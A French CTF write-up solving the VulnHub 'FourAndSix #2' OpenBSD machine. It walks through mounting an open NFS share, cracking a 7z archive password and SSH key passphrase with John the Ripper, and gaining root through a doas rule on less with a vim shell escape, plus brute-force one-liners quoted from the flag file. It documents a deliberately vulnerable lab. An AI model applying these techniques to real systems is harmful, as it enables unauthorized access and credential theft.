---
title: "Solution du CTF FourAndSix #2 de VulnHub"
tags: [CTF, VulnHub]
---

[FourAndSix: 2](https://vulnhub.com/entry/fourandsix-201,266/) reprend comme son prédécesseur un système OpenBSD à pénétrer.

La VM n'expose qu'un serveur SSH avec du rpcinfo/nfs/mountd :

```console
$ rpcinfo -p 192.168.56.205
   program vers proto   port  service
    100000    2   tcp    111  portmapper
    100000    2   udp    111  portmapper
    100005    1   udp    757  mountd
    100005    3   udp    757  mountd
    100005    1   tcp   1010  mountd
    100005    3   tcp   1010  mountd
    100003    2   udp   2049  nfs
    100003    3   udp   2049  nfs
    100003    2   tcp   2049  nfs
    100003    3   tcp   2049  nfs
$ showmount -e 192.168.56.205
Export list for 192.168.56.205:
/home/user/storage (everyone)
$ sudo mount 192.168.56.205:/home/user/storage /mnt/
[sudo] Mot de passe de root : 
Created symlink /run/systemd/system/remote-fs.target.wants/rpc-statd.service → /usr/lib/systemd/system/rpc-statd.service.
$ cd /mnt/
$ ls
backup.7z
```

Sur le partage `/home/user/storage` exposé se trouve une archive 7z qui semble contenir une clé privée SSH :

```
   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2018-10-28 10:45:33 ....A         9000        61808  hello1.jpeg
2018-10-28 10:45:33 ....A         5247               hello2.png
2018-10-28 10:45:33 ....A         8903               hello3.jpeg
2018-10-28 10:45:33 ....A         8330               hello4.png
2018-10-28 10:45:33 ....A        10038               hello5.jpeg
2018-10-28 10:45:33 ....A         5931               hello6.png
2018-10-28 10:45:33 ....A         6181               hello7.jpeg
2018-10-28 10:45:33 ....A         8182               hello8.jpeg
2018-10-28 11:50:57 ....A         1856               id_rsa
2018-10-28 11:52:57 ....A          398               id_rsa.pub
------------------- ----- ------------ ------------  ------------------------
```

Malheureusement lors de la décompression, on se voit demander un mot de passe.

Avec la version `Jumbo` de `JohnTheRipper` sont présents différents utilitaires permettant de générer un hash à partir du fichier protégé. On peut ensuite casser ce hash normalement.

Pour le format 7z on utilise `7z2john.pl`. Le cassage du mot de passe s'effectue rapidement :

```
chocolate        (backup.7z)
```

Cette fois, c'est lorsque l'on veut utiliser la clé SSH qu'une passphrase est demandée. On réitère donc la manipulation avec `ssh2john.py` puis on casse la passphrase :

```
12345678         (/tmp/id_rsa)
```

On peut alors se connecter sur le SSH et on note tout de suite qu'on est membre du groupe wheel :

```console
fourandsix2$ id
uid=1000(user) gid=1000(user) groups=1000(user), 0(wheel)
```

Je jette aussi un coup d'œil au fichier de configuration `doas` qui est un équivalent de `sudo` sur cet OS.

```console
fourandsix2$ cat /etc/doas.conf                                                                                                                                                                                  
permit nopass keepenv user as root cmd /usr/bin/less args /var/log/authlog
permit nopass keepenv root as root
fourandsix2$ doas /usr/bin/less /var/log/authlog
```

On peut exécuter `less` en tant que root. Les pagers comme `less` permettent normalement de faire exécuter des commandes.

Ici ça ne fonctionnait pas alors comme pour le [CTF Bandit level 25]({% link _posts/2023-04-28-Solution-du-Wargame-Bandit-de-OverTheWire.md %}) j'ai fait charger le fichier dans `Vim` avec la touche `v` et ensuite fait exécuter un shell avec `:!sh`

```console
fourandsix2# id
uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
fourandsix2# cd /root
fourandsix2# ls
.Xdefaults .cshrc     .cvsrc     .forward   .login     .profile   .ssh       flag.txt
fourandsix2# cat flag.txt                                                                                                                                                      
Nice you hacked all the passwords!

Not all tools worked well. But with some command magic...:
cat /usr/share/wordlists/rockyou.txt|while read line; do 7z e backup.7z -p"$line" -oout; if grep -iRl SSH; then echo $line; break;fi;done

cat /usr/share/wordlists/rockyou.txt|while read line; do if ssh-keygen -p -P "$line" -N password -f id_rsa; then echo $line; break;fi;done


Here is the flag:
acd043bc3103ed3dd02eee99d5b0ff42
```
